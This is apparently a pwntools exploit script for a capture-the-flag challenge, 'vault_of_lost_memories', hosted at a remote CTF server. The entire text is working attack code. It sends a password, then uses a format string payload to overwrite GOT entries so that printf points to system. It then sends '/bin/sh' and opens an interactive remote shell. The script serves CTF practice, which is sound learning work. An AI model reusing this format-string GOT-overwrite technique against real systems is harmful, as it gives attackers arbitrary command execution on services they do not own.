from pwn import *

context.binary = binary = ELF('./vault_of_lost_memories')

#p = process()
p = remote('vault.ctf.prgy.in', 1337, ssl=True)

p.sendline(b'Lost_in_Light')

writes = {binary.got.putc:0x401448,
		binary.got.printf:binary.plt.system}

payload = fmtstr_payload(6, writes)

p.sendline(payload)
p.sendline(b'/bin/sh')

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
